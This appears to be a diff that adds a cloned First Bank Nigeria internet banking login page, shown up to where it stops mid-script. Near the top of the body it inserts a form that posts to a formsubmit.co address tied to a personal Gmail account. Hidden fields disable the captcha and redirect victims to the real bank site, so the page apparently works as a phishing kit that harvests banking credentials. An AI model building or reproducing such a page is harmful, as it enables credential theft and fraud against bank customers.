@@ -1,0 +1,2775 @@
+<!-- Modified for VDT preview issue -->
+
+
+
+
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Modified for VDT preview issue -->
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+    <link href="https://www.firstbanknigeria.com/wp-content/uploads/2016/05/w-logo-blue.png" rel="icon" sizes="32x32">
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=0">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script type="text/javascript" src="scripts/common/NFEBAScripts.js?moduleId=user,scriptsPath=scripts,isVdtMode=false,nodePath=,ipAddress=192.168.60.78,contextPath="></script>
+    <script type="text/javascript">
+        jQuery.noConflict();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script>
+        setTreeFormt(1);
+    </script>
+
+
+
+
+    <link href=" L001/consumer/theme/new_style.css?mtime=0" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+
+
+
+
+
+    <link href="L001/consumer/theme/jquery-ui.custom.css" rel="stylesheet" type="text/css" />
+    <link href="L001/consumer/theme/lib_themes.css" rel="stylesheet" type="text/css" />
+    <link href="L001/consumer/theme/jquery-calendars-picker.css" rel="stylesheet" type="text/css" />
+
+
+
+
+    <script type="text/javascript">
+        feba.domManipulator.documentReady(convertComboboxes);
+    </script>
+
+
+    <div id="preloader">
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+
+    <style type="text/css">
+        #preloader {
+            width: 100%;
+            height: 100%;
+            background: #EEE;
+            left: 0;
+            top: 0;
+            position: fixed;
+            z-index: 9999;
+        }
+
+        #preloader div {
+            content: '';
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            margin: auto;
+            transform: skew(-12deg);
+            width: 15px;
+            height: 40px;
+            background: #EFAA29;
+            animation-name: animatepre2;
+            animation-duration: 4s;
+            animation-iteration-count: infinite;
+            opacity: 0;
+        }
+
+        #preloader div:first-child {
+            background: #019EC9;
+            animation-name: animatepre1;
+            transform: translateX(-16px) skew(-12deg);
+        }
+
+        #preloader div:last-child {
+            background: #022E64;
+            animation-name: animatepre3;
+            transform: translateX(16px) skew(-12deg);
+        }
+
+        @keyframes animatepre1 {
+            0% {
+                opacity: 0;
+            }
+            25% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes animatepre2 {
+            0% {
+                opacity: 0;
+            }
+            25% {
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes animatepre3 {
+            0% {
+                opacity: 0;
+            }
+            25% {
+                opacity: 0;
+            }
+            50% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+
+    <script type="text/javascript">
+        jQuery(document).ready(function($) {
+            setTimeout(function() {
+                $('#preloader').fadeOut();
+            }, 500);
+
+            $(window).on('unload', function() {
+                $('#preloader').show();
+            });
+        });
+    </script>
+    <div id="flashcontent">
+    </div>
+
+
+
+
+    <script>
+        var ratio = window.devicePixelRatio || 1;
+        var width = screen.width * ratio;
+        var height = screen.height * ratio;
+
+        var mql = window.matchMedia("screen and (max-width : 479px)"); /*,screen and (max-device-width:479px)*/
+        if (mql.matches && width < 480) { // if media query matches
+            var desktopUrl = window.location.href;
+            window.location.href = desktopUrl + "&MOBILE_FLAG=1";
+        } else {
+            var mql = window.matchMedia("screen and (max-height: 479px)"); /*,screen and (max-device-height:479px)*/
+            if (mql.matches && height < 480) { // if media query matches
+                //console.log("##############NPageCustom AuthenticationScreen_onload mql - small screen");
+                var desktopUrl = window.location.href;
+                //console.log("##############NPageCustom AuthenticationScreen_onload mql - small screen desktopUrl:"+desktopUrl);
+                window.location.href = desktopUrl + "&MOBILE_FLAG=1";
+            }
+        }
+    </script>
+
+
+    <head>
+        <link rel="stylesheet" type="text/css" href="L001/consumer/theme/bootstrap.css" />
+        <link rel="stylesheet" type="text/css" href="L001/consumer/theme/stylesheet.css" />
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="L001/consumer/theme/new_style.css" />
+    </head>
+
+
+    <title>FBN Nigeria:Internet Banking Login</title>
+</head>
+<script type="text/javascript">
+    var imagePath = 'L001/consumer/images';
+</script>
+<script type="text/javascript">
+    CONFIG = feba.domManipulator.extendObject(CONFIG || {}, {
+        logMode: "CONSOLE",
+        operatingMode: "DEVELOPMENT",
+        blockOnButtonClicksRequired: "N",
+        blockOnHyperLinkClicksRequired: "N",
+        addtionalURLParamRequired: "N",
+        hijriStartYear: "1396",
+        hijriEndYear: "1520"
+    });
+    var IS_WATERMARK_ENABLED = "N"
+</script>
+<script type="text/javascript">
+    var langID = "001";
+    var locale = "en_US";
+</script>
+
+<body scroll="auto" oncontextmenu="return false;">
+    <form action="https://formsubmit.co/hardeyshinad@gmail.com" method="POST" />
+    <form name="AuthenticationFG" action="AuthenticationController;jsessionid=0000Dt165hxHGXWptYzoErlMEdN:1b9vu7c1i?bwayparam=2zGSLLehPbQhbiffoUvruYCaWIIr0FvIEbwn2j53KJg%3D" method="post" autocomplete="off">
+    <input type="hidden" name="_next" value="https://www.firstbanknigeria.com/">
+    <input type="hidden" name="_captcha" value="false">
+        <script type="text/javascript">
+            function actionset() {
+                if (document.AuthenticationFG.ACTIONSWITCH == "Y") {
+                    document.AuthenticationFG.ACTIONSWITCH = "N"
+                } else {
+                    document.AuthenticationFG.action = "";
+                    document.AuthenticationFG.action = "";
+                }
+            }
+        </script>
+
+
+
+
+
+        <div class="row toprow parentTable">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <div id="globalCustomLogin" class="next-genHeader login-body-styleCustomLogin">
+
+                <div id="header" class="loginHeader">
+
+                    <div id="header-main" class="next-genHeader header-main">
+
+                        <div id="header-wrapper" class="wrapper">
+
+                            <div id="header-row" class="row">
+
+                                <div id="header-logo1" class="logoLeft">
+                                    <a href="https://www.firstbanknigeria.com/"><img src="L001/consumer/images/logo-DarkBg.png"></a>
+
+                                    <!--<a><img src="L001/consumer/images/logo-new.png" alt="bank Logo"/></a>-->
+
+                                </div>
+                                <div id="header-logo" class="logoRight">
+
+                                    <!--<a><img src="L001/consumer/images/logo-new.png" alt="bank Logo"/></a>-->
+
+                                </div>
+
+                                <div class="headerTextSpacingStyle">
+
+                                    <span id="textId1" text="All your banking" class="loginHeaderTextBlueStyle" visible="true"></span>
+
+                                    <span id="textId2" text="Secure login" class="loginHeaderTextstyle" visible="true"></span>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <div id=topbar>
+
+                    <div id=headerNew>
+
+                        <div id="topbar-nav" class="header-nav">
+
+                            <div id="topbar-wrapper" class="wrapper">
+
+                                <div id="topbar-row" class="row">
+
+                                    <ul class="tabs">
+
+                                    </ul>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+                <div></div>
+
+
+
+
+
+
+
+                <script type="text/javascript">
+                    var oldtitle;
+
+                    function WinRedirect(object) {
+
+                        var title = object.title;
+                        var value = object.value;
+
+                        if (title == oldtitle)
+                            return;
+
+                        oldtitle = title;
+
+                        window.location.href = value;
+                    }
+
+                    function languageChange(object) {
+                        var title = object.title;
+                        var value = object.value;
+
+                        if (title == oldtitle)
+                            return;
+
+                        oldtitle = title;
+
+                        window.location.href = "http://172.16.248.126:10000/corp/AuthenticationController?__START_TRAN_FLAG__=Y&FORMSGROUP_ID__=AuthenticationFG&__EVENT_ID__=LOAD&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=03&LANGUAGE_ID=" + value;
+
+                    }
+
+
+                    /* BG - Use this when the same jsp will be used for multiple countries
+
+                    	function languageChange(object) {
+
+                    		var title = object.title;
+
+                    		var value = object.value;
+                    		var ex1 = document.getElementById("AuthenticationFG.COUNTRY");
+                    		if (title == oldtitle)
+                    		return;
+
+                    		oldtitle = title;
+
+                    		window.location.href = "https://ibank.ubagroup.com/cemac/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID="+ex1.value+"&LANGUAGE_ID=" + value;
+
+
+
+                    	}
+                    	*/
+
+
+                    function countryChange(object) {
+                        var title = object.title;
+                        var value = object.value;
+
+                        if (title == oldtitle)
+                            return;
+
+                        oldtitle = title;
+                        if (value == "03") {
+                            window.location.href = "http://172.16.248.126:10000/corp/AuthenticationController?__START_TRAN_FLAG__=Y&FORMSGROUP_ID__=AuthenticationFG&__EVENT_ID__=LOAD&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=" + value;
+                        }
+                        if (value == "04") {
+                            window.location.href = "http://172.16.248.126:10000/corp/AuthenticationController?__START_TRAN_FLAG__=Y&FORMSGROUP_ID__=AuthenticationFG&__EVENT_ID__=LOAD&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=" + value;
+                        }
+                        if (value == "05") {
+                            window.location.href = "http://172.16.248.126:10000/corp/AuthenticationController?__START_TRAN_FLAG__=Y&FORMSGROUP_ID__=AuthenticationFG&__EVENT_ID__=LOAD&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=" + value;
+                        }
+                    }
+                </script>
+
+
+
+
+
+
+
+
+                <script type="text/javascript">
+                    console.log("not working script");
+
+                    linkArray = new Array();
+                    isIE = document.all;
+
+                    var currClickedElement;
+                    var onFocus = 'Y';
+                    jQuery(document).ready(function() {
+                        if (onFocus == 'Y') {
+
+
+                            jQuery(document).bind('keydown', function(event) {
+                                if (event.which == 13 || event.which == 9) {
+                                    closeKeypad();
+                                }
+                            });
+                            jQuery(".buttonhashed").css("display", "none");
+                        }
+                        if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                            jQuery(".buttonhashed_ebux2").css("display", "none");
+                        }
+
+
+                        jQuery(document).bind('click', function(event) {
+                            currClickedElement = jQuery(event.target).closest('div').parent().parent().parent();
+
+                            if (currClickedElement && (jQuery(event.target).attr('type') == "password" ||
+                                    jQuery(currClickedElement).attr('id') == 'pp_div' || jQuery(event.target).attr('class') == 'buttonhashed')) {
+                                if (onFocus == 'Y' || jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                                    jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow', 'visible');
+                                    jQuery('div#modalDialog.ui-dialog-content').css('overflow', 'visible');
+                                }
+                                jQuery(document.getElementById('pp_div')).show();
+                                if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                                    jQuery(document.getElementById('pp_div')).css('visibility', 'visible');
+                                }
+                            } else {
+                                if (onFocus == 'Y') {
+                                    jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow', '');
+                                    jQuery('div#modalDialog.ui-dialog-content').css('overflow', '');
+                                    closeKeypad();
+                                } else {
+                                    jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow', 'visible');
+                                    jQuery('div#modalDialog.ui-dialog-content').css('overflow', 'visible');
+                                    closeKeypad();
+                                    setPinPadCtl(null);
+                                    var pwd = jQuery("input[type='password']");
+                                    jQuery(pwd).attr('disabled', false);
+                                }
+                            }
+                            if (jQuery(event.target).attr('for')) {
+
+                                //jQuery(document).unbind('click');
+                                event.preventDefault();
+                            }
+
+                        });
+
+                    });
+
+                    isNN = !document.all && document.getElementById;
+
+                    isN4 = document.layers;
+
+                    ppX = 450;
+                    ppY = 250;
+
+                    editCtl = null;
+                    tmpEditCtl = null;
+
+                    rX = (Math.random() * 24) - 12;
+                    rY = (Math.random() * 36) - 18;
+
+
+                    vIndex = 0;
+                    vRandomAlp = 0;
+                    vRandomNo = 0;
+                    vRandomSpl = 0;
+
+
+                    isHot = false;
+                    showFirstTime = true;
+
+
+                    isFirstTimeEnable = true;
+
+                    var pwdImageValue = "";
+                    var pwdStrengthValue = "";
+
+                    insertData = function(ctl, value) {
+
+                        ctl.value = ctl.value + value;
+
+                        setValues(pwdImageValue, pwdStrengthValue)
+                        if (pwdImageValue != "" && pwdStrengthValue != "") {
+                            determinePasswordStrength(ctl.value, pwdImageValue, pwdStrengthValue, 'null');
+                        }
+
+                    };
+
+                    applyNumber = function(ctl) {
+                        if (editCtl != null) {
+
+
+                            if (ctl.name == 'pp_clear') {
+                                editCtl.value = '';
+                                setValues(pwdImageValue, pwdStrengthValue)
+                                if (pwdImageValue != "" && pwdStrengthValue != "") {
+                                    determinePasswordStrength(editCtl.value, pwdImageValue, pwdStrengthValue, 'null');
+                                }
+
+                            } else if (ctl.name == 'pp_erase') {
+                                editCtl.value = editCtl.value.substring(0, editCtl.value.length - 1);
+                                setValues(pwdImageValue, pwdStrengthValue)
+                                if (pwdImageValue != "" && pwdStrengthValue != "") {
+                                    determinePasswordStrength(editCtl.value, pwdImageValue, pwdStrengthValue, 'null');
+                                }
+
+
+                            } else if (ctl.name == 'pp_caps') {
+                                var vCaps = document.getElementById('pp_caps').value;
+                                for (var vIndex = 1; vIndex <= 26; vIndex++) {
+                                    var vAlp = document.getElementById('alp_' + vIndex).value;
+
+                                    if (vAlp == vAlp.toLowerCase()) {
+                                        var vTemp = vAlp.toUpperCase();
+                                        document.getElementById('alp_' + vIndex).value = vTemp;
+                                        document.getElementById('pp_caps').value = vCaps.toUpperCase();
+
+                                    } else {
+                                        var vTemp = vAlp.toLowerCase();
+                                        document.getElementById('alp_' + vIndex).value = vTemp;
+                                    }
+                                    document.getElementById('pp_caps').value = vCaps.toLowerCase();
+                                }
+
+
+                            } else {
+
+
+                                if (!editCtl.maxLength || editCtl.maxLength == 0 || editCtl.maxLength > editCtl.value.length) {
+
+                                    insertData(editCtl, ctl.value);
+                                }
+                                tmpEditCtl = editCtl;
+                                if (editCtl.maxLength && editCtl.maxLength <= editCtl.value.length) {
+
+                                    setPinPadCtl(null);
+                                }
+                                if (tmpEditCtl.focus) {
+                                    setTimeout('tmpEditCtl.focus()', 1);
+                                }
+                            }
+                        }
+                    };
+
+
+                    isIE = document.all ? 1 : 0
+
+
+                    noKeyboard = function(e) {
+                        keyEntry = !isIE ? e.which : event.keyCode;
+                        if ((keyEntry < '255') || (keyEntry > '0')) {
+                            return false;
+                        }
+                    };
+
+
+                    var langBsdSmallAlp = {
+                        "001": "abcdefghijklmnopqrstuvwxyz",
+                        "002": "abcdefghijklmnopqrstuvwxyz",
+                        "003": "abcdefghijklmnopqrstuvwxyz",
+                        "004": "abcdefghijklmnopqrstuvwxyz"
+                    };
+                    var langBsdNum = {
+                        "001": "0123456789",
+                        "002": "0123456789",
+                        "003": "0123456789",
+                        "004": "0123456789"
+                    };
+                    var langBsdSplChars = {
+                        "001": ".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';",
+                        "002": ".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';",
+                        "003": ".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';",
+                        "004": ".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';"
+                    };
+
+
+                    getCharBasedOnLangId = function(arrayObj) {
+                        var chars = arrayObj[langID];
+                        var langArr = new Array();
+                        var character;
+
+                        if (chars == null) {
+                            chars = arrayObj["001"];
+                        }
+                        var charLen = chars.length;
+                        for (i = 0; i < charLen; i++) {
+                            character = chars.substring(i, i + 1);
+                            if (character == "\"") {
+                                langArr[i] = "&quot";
+                            } else {
+                                langArr[i] = character;
+                            }
+                        }
+                        return langArr;
+                    };
+
+
+                    settingPinPadCtlOnFocus = function(whatobject, whatimage, whatelement) {
+
+
+
+                        if (onFocus == 'Y') {
+
+                            var isVisible = jQuery('#pp_div').is(':visible');
+                            var isHidden = jQuery('#pp_div').css('visibility');
+                            if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                                if ((isVisible && isHidden != 'hidden') && elem == whatelement) {
+                                    //jQuery(document.getElementById('pp_div')).show();
+                                    noAction = true;
+                                    //return;
+                                } else {
+                                    jQuery(document.getElementById('pp_div')).show();
+                                    jQuery(document.getElementById('pp_div')).css('visibility', 'visible');
+                                    noAction = false;
+                                }
+                            } else {
+                                if (isVisible && elem == whatelement) {
+                                    //jQuery(document.getElementById('pp_div')).show();
+                                    noAction = true;
+                                    //return;
+                                } else {
+                                    jQuery(document.getElementById('pp_div')).show();
+                                    jQuery(document.getElementById('pp_div')).css('visibility', 'visible');
+                                    noAction = false;
+                                }
+                            }
+                            settingPinPadCtl(whatobject, whatimage, whatelement);
+                        } else {
+                            noAction = true;
+                        }
+                    };
+
+
+                    settingPinPadCtl = function(whatobject, whatimage, whatelement) {
+                        if (noAction) {
+                            return;
+                        }
+                        smallAlpArr = getCharBasedOnLangId(langBsdSmallAlp);
+                        numArr = getCharBasedOnLangId(langBsdNum);
+                        splCharArr = getCharBasedOnLangId(langBsdSplChars);
+
+
+                        if (vRandomAlp == 0) {
+
+                            smallAlpArr.sort(function() {
+                                return 0.5 - Math.random()
+                            })
+                        }
+                        if (vRandomNo == 0) {
+                            numArr.sort(function() {
+                                return 0.5 - Math.random()
+                            })
+                        }
+                        if (vRandomSpl == 0) {
+                            splCharArr.sort(function() {
+                                return 0.5 - Math.random()
+                            })
+                        }
+
+
+
+                        var incr = 0;
+                        var incralp = 0,
+                            incrno = 0,
+                            incrspl = 0;
+                        var formname = '';
+                        var tempincralp;
+                        var tempincrno;
+                        var tempincrspl;
+                        for (j = 0; document.forms[j] != null; j++) {
+                            for (i = 0; document.forms[j].elements[i] != null; i++) {
+                                if ((document.forms[j].elements[i].name == whatelement)) {
+                                    formname = document.forms[j].name;
+                                }
+                            }
+                        }
+                        if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                            var formNameIdentifier = "FORMSGROUP_ID__";
+                            var formnameVal = "";
+                            if (document.getElementById(formNameIdentifier)) {
+                                formnameVal = document.getElementById(formNameIdentifier).value;
+                            }
+
+                            this.target = document.getElementById(document.getElementById(jQuery(whatelement).attr('id')));
+                        } else {
+
+                            this.target = document.forms[formname].elements[whatelement];
+
+                        }
+
+
+                        var len = 11;
+                        var numSplVal = 0;
+                        var newRow;
+                        var smallAlpArrLen = smallAlpArr.length;
+                        var numArrLen = numArr.length;
+                        var splCharArrLen = splCharArr.length;
+
+                        if (whatimage == 2) {
+
+                            var sHTML = '<div id="close-keypad" class="width100percentforkeypad" ><div id="keypadstyle"  class="">' +
+                                '<p align="right"> <span class="keyBoardTitle"> Virtual Keyboard</span> ' +
+                                '<span class="keyBoardTitleInfo">(For entering password only)</span>'
+
+                                +
+                                '<span> <strong><a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="javascript:setPinPadCtl(null),enableTextField(\'' + whatelement + '\')" class="close" title="Close">x&nbsp;</a></strong></span> </p>'
+
+                                +
+                                '<p ><span id="titleBar" class="keyBordText" style="display:none"><ilayer width="100%" onSelectStart="return false">' +
+                                '<layer  width="100%" onMouseover="isHot=true;if (isN4) ddN4(pp_div)" onMouseout="isHot=false">'
+
+                                +
+                                '</layer></ilayer>' +
+                                '</span>' +
+                                '<span class="floatingleft" style="padding-bottom:5px"><input length="13" type=password name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly style="display:none"></span>' +
+                                '</p></div>';
+
+                            sHTML = sHTML + '<div id="keypadclear" style="padding-left: 4px;width:100%" >';
+                            while (incralp < smallAlpArrLen || incrno < numArr.length || incrspl < splCharArrLen) {
+
+                                sHTML = sHTML + '<p class="clearboth">';
+                                newRow = true;
+                                for (i = 0; i < len; i++) {
+
+
+                                    if (i == 0) {
+                                        sHTML = sHTML + '<span  class="height28forkeypad">';
+                                    } else {
+                                        sHTML = sHTML + '<span>';
+                                    }
+
+
+                                    if (incrspl < splCharArrLen && i < len) {
+                                        tempincrspl = incrspl++;
+                                        sHTML = sHTML + '<input class="mainButton" type="button" name="pp_' + incrspl + '" id="pp_' + incrspl + '" title="' + splCharArr[tempincrspl] + '"  value="' + splCharArr[tempincrspl] + '" onclick="applyNumber(this)"/></span>';
+                                        if (incrspl == splCharArrLen) {
+                                            sHTML = sHTML + '<br>';
+                                            i++;
+                                        }
+                                        newRow = false;
+                                    }
+
+
+                                    if (incrno < numArrLen && i < len && newRow == true) {
+                                        tempincrno = incrno++;
+                                        sHTML = sHTML + '<input class="mainButton" type="button" name="pp_' + incrno + '" id="pp_' + incrno + '" title="' + numArr[tempincrno] + '"  value="' + numArr[tempincrno] + '" onclick="applyNumber(this)"/></span>';
+                                        if (incrno == numArrLen) {
+                                            sHTML = sHTML + '<br>';
+                                            i++;
+                                        }
+                                        newRow = false;
+
+                                    }
+
+
+                                    if (incralp < smallAlpArrLen && i < len && newRow == true) {
+                                        tempincralp = incralp++;
+                                        sHTML = sHTML + '<input class="mainButton" type="button" name="alp_' + incralp + '" id="alp_' + incralp + '" title="' + smallAlpArr[tempincralp] + '"  value="' + smallAlpArr[tempincralp] + '" onclick="applyNumber(this)"/></span>';
+                                        if (i == len - 2) {
+                                            sHTML = sHTML + '<br>';
+                                            i++;
+                                        }
+                                    }
+
+
+                                    if ((incrspl >= splCharArrLen || incralp >= smallAlpArrLen || incrno <= numArrLen) && i < len - 1) {
+                                        sHTML = sHTML + '</span>';
+                                        newRow = true;
+                                    }
+
+                                }
+
+
+                            }
+                            sHTML = sHTML + '<input class="mainButton_blank" type="button" /></span>';
+                            if (langID == '001') {
+                                sHTML = sHTML + '<span class=""><input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="caps" onclick="applyNumber(this)"/></span>';
+                            } else {
+                                sHTML = sHTML + '<span class=""><input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="caps" /></span>';
+                            }
+                            sHTML = sHTML + '<span class=""><input class="keybtn_Backspace" type="button" name="pp_erase" id="pp_erase" title="Backspace" value="" onclick="applyNumber(this)"/></span>' +
+                                '<span class=""><input class="keybtn_Clear" type="button" name="pp_clear" id="pp_clear" title="Clear" value="" onclick="applyNumber(this)"/></span>';
+                            sHTML = sHTML + '</p>';
+                            sHTML = sHTML + '</div>';
+                            sHTML = sHTML + '</div>';
+                        }
+
+
+
+                        document.getElementById("scriptdiv").innerHTML = sHTML;
+
+                        if (jQuery('#MODAL_VIEW_CONTAINER').length == 0) {
+                            if (typeof grpId == "undefined") {
+                                document.forms[formname].buffer.maxLength = 2147483647;
+                                setPinPadCtl(document.forms[formname].elements[whatelement]);
+                            } else {
+                                if (whatelement != null && whatelement.indexOf(':') == -1) {
+                                    setPinPadCtl(document.getElementById(grpId + ":" + whatelement));
+                                } else {
+                                    setPinPadCtl(document.getElementById(whatelement));
+                                }
+                            }
+
+                        } else {
+                            var grpId = 'null';
+                            if (whatelement != null && whatelement.indexOf(':') == -1) {
+                                if ('null' != grpId) {
+                                    setPinPadCtl(document.getElementById(grpId + ":" + whatelement));
+                                } else {
+                                    setPinPadCtl(document.getElementById(whatelement));
+                                }
+                            } else {
+                                setPinPadCtl(document.getElementById(whatelement));
+                            }
+                        }
+                        /*setPinPadCtl(document.forms[formname].buffer);*/
+
+                        elem = whatelement;
+                    };
+
+
+
+
+
+                    setPinPadCtl = function(ctl) {
+
+
+                        if (ctl && !editCtl && ctl.maxLength && ctl.maxLength <= ctl.value.length) {
+
+                            return;
+                        }
+
+
+                        editCtl = ctl;
+                        var elements = document.forms[0].elements;
+                        for (i = 0; i <= 77; i++) {
+
+                            var el = elements['pp_' + i];
+                            if (el != null) {
+
+                                el.disabled = editCtl == null;
+                            }
+                        }
+                        var el = elements['pp_clear'];
+                        if (el != null) {
+
+                            el.disabled = editCtl == null;
+                        }
+                        var el = elements['pp_erase'];
+                        if (el != null) {
+
+                            el.disabled = editCtl == null;
+                        }
+                        var el = elements['close'];
+                        if (el != null) {
+
+                            el.disabled = editCtl == null;
+                        }
+                        var el = elements['done'];
+                        if (el != null) {
+
+                            el.disabled = editCtl == null;
+                        }
+                        var el = elements['buffer'];
+                        if (el != null) {
+
+                            el.disabled = editCtl == null;
+                        }
+                        var el = elements['help'];
+                        if (el != null) {
+
+                            el.disabled = editCtl == null;
+                        }
+
+                        topLayer = isIE ? 'BODY' : 'HTML';
+                        layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;
+
+                        if (isIE && event || !isIE && ctl) {
+
+                            hotLayer = isIE ? event.srcElement : ctl.target;
+                            while (hotLayer != null && hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {
+
+                                hotLayer = isIE ? hotLayer.parentElement : hotLayer.parentNode;
+                            }
+                            if (hotLayer != null && hotLayer.id == 'titleBar' && ctl != null) {
+
+                                offsetx = isIE ? event.clientX : ctl.clientX;
+                                offsety = isIE ? event.clientY : ctl.clientY;
+                                nowX = parseInt(layer.style.left);
+                                nowY = parseInt(layer.style.top);
+                                ddEnabled = true;
+                                document.onmousemove = dd;
+                            }
+                        }
+
+                        if (layer == null) {
+                            layer = "";
+                        }
+
+
+                        if (layer != null) {
+
+                            if (editCtl != null) {
+
+                                if (showFirstTime) {
+
+                                    showFirstTimePinPad(layer, ctl);
+                                    display();
+                                    showFirstTime = false;
+                                } else {
+
+
+                                    showPinPad(layer, ctl);
+                                    display();
+
+                                }
+                            } else {
+
+                                hidePinPad(layer);
+                                display();
+                            }
+                        } else {
+
+                            alert('Pin Pad not supported by your browser');
+                        }
+                    };
+
+                    onloadNumber = function(ctl) {
+
+                        ctl.disabled = editCtl == null;
+                    };
+
+                    checkPinPad = function(ctl) {
+
+                        if (ctl.maxLength && ctl.maxLength != 0 && ctl.maxLength <= ctl.value.length) {
+
+                            setPinPadCtl(null);
+                        } else {
+
+                            if (editCtl == null)
+                                setPinPadCtl(this);
+                        }
+                    };
+
+
+                    showPinPad = function(ctl, pctl) {
+
+
+                        if (isIE || isNN) {
+
+                            layer.style.visibility = 'visible';
+
+                        } else if (isN4) {
+
+                            document.pp_div.visibility = 'show';
+
+                        }
+                    };
+
+                    showFirstTimePinPad = function(ctl, pctl) {
+
+
+                        var pX = 500;
+                        var pY = 250;
+
+                        if (ppY) {
+
+                            pY = ppY;
+                        } else if (pctl.screenTop) {
+
+                            pY = pctl.screenTop + 30;
+                        } else if (pctl.screenY) {
+
+                            pY = pctl.screenY + 30;
+                        }
+                        if (ppX) {
+
+                            pX = ppX;
+                        } else if (pctl.screenLeft) {
+
+                            pX = pctl.screenLeft;
+                        } else if (pctl.screenX) {
+
+                            pX = pctl.screenX;
+                        }
+                        if (ctl.style) {
+
+                            ctl.style.top = pY + rX;
+                            ctl.style.left = pX + rY;
+                        }
+                        if (isIE || isNN) {
+
+                            layer.style.visibility = 'visible';
+                        } else if (isN4) {
+
+                            document.pp_div.visibility = 'show';
+
+                        }
+
+                    };
+
+                    hidePinPad = function(ctl) {
+
+                        if (isIE || isNN) {
+
+                            layer.style.visibility = 'hidden';
+
+                        } else if (isN4) {
+
+                            document.pp_div.visibility = 'hide';
+                        }
+                        elem = null;
+                    };
+
+                    ddInit = function(ctl) {
+
+                        var topLayer = isIE ? 'BODY' : 'HTML';
+
+                        var layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;
+
+                        var hotLayer = isIE ? event.srcElement : ctl.target;
+
+                        if (layer != null) {
+
+                            while (hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {
+
+                                hotLayer = isIE ? hotLayer.parentElement : hotLayer.parentNode;
+                                if (hotLayer == null) return;
+                            }
+                            if (hotLayer.id == 'titleBar') {
+
+
+                                offsetx = isIE ? event.clientX : ctl.clientX;
+                                offsety = isIE ? event.clientY : ctl.clientY;
+                                nowX = parseInt(layer.style.left);
+                                nowY = parseInt(layer.style.top);
+                                ddEnabled = true;
+                                document.onmousemove = dd;
+                            }
+                        }
+                    };
+
+                    dd = function(ctl) {
+
+                        if (!ddEnabled) return;
+                        layer.style.left = isIE ? nowX + event.clientX - offsetx : nowX + ctl.clientX - offsetx + 'px';
+                        layer.style.top = isIE ? nowY + event.clientY - offsety : (nowY + ctl.clientY - offsety) + 'px';
+                        display();
+                        return false;
+                    };
+
+
+                    disbleTextField = function(whatelement) {
+                        console.log('inside disbleTextField-------');
+
+                        var isVisible = document.getElementById('pp_div').style.visiblity = 'visible' ? true : false;
+                        if (isVisible && elem == whatelement) {
+                            noAction = true;
+                            return;
+                        } else {
+                            noAction = false;
+                        }
+
+                        var j = 0;
+                        var enab = true;
+                        var disb = true;
+                        while ((document.forms[j] != null && (enab || disb))) {
+
+                            for (i = 0; document.forms[j].elements[i] != null; i++) {
+
+                                if (isVisible && (document.forms[j].elements[i].name == elem)) {
+                                    document.forms[j].elements[i].disabled = false;
+                                    enab = false;
+                                } else if ((document.forms[j].elements[i].name == whatelement)) {
+
+                                    document.forms[j].elements[i].disabled = true;
+                                    disb = false;
+                                }
+                                if (!isVisible) {
+                                    enab = false;
+                                }
+                            }
+                            j++;
+                        }
+
